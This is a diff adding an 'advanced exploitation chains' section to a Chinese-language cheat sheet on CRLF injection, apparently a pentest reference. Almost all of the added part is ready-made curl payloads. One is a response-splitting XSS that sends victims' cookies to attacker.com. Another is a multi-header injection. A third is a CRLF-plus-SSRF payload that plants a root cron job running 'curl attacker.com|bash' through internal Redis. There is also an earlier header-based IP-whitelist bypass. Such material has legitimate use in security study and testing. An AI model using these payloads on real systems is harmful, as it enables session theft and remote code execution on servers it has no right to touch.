@@ -95,6 +95,47 @@ curl -H "X-Forwarded-For: 127.0.0.1%0d%0aX-Admin:true" https://target.com/api
 # → IP白名单绕过
 ```
 
+## 6. 进阶利用链
+
+### 6.1 CRLF → XSS → Cookie窃取 (完整链)
+
+```bash
+# Step 1: CRLF注入构造完整XSS页面
+# 注入点: /redirect?url=
+curl "https://target.com/redirect?url=%0d%0a%0d%0a<script>new%20Image().src='http://attacker.com/log?'%2Bdocument.cookie</script>"
+
+# 响应拆分效果:
+# HTTP/1.1 302 Found
+# Location: /home
+# 
+# <script>new Image().src='http://attacker.com/log?'+document.cookie</script>
+# <html><body>...       ← 原有响应被丢弃
+
+# Step 2: 受害者访问链接 → Cookie外带到 attacker.com
+# Step 3: 攻击者检查日志 → 获得受害者Cookie
+```
+
+### 6.2 Header 反射链 (多个CRLF注入点组合)
+
+```bash
+# 场景: 多个Header被反射到响应
+curl -X GET "https://target.com/api/data" \
+  -H "X-API-Key: test%0d%0aContent-Length:%200" \
+  -H "X-Client-ID: test%0d%0aX-Injected:%20true"
+
+# 效果: 2个非键化Header同时注入 → 构造更复杂的响应篡改
+```
+
+### 6.3 CRLF + SSRF 组合 (内网投毒)
+
+```bash
+# 场景: 存在SSRF + 响应头未过滤
+# 攻击内网Redis:
+curl -X POST "https://target.com/proxy" \
+  -d 'url=http://127.0.0.1:6379/%0d%0aSET%20evil%20%22%0a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20curl%20attacker.com%7Cbash%0a%22%0d%0aCONFIG%20SET%20dir%20%2fvar%2fspool%2fcron%2f%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSAVE%0d%0a'
+# (概念性, 实际需要Gopher)
+```
+
 ---
 
-*参考: OWASP CRLF Injection + 实战案例*
+*参考: OWASP CRLF Injection + CWE-93/113 + 实战案例*
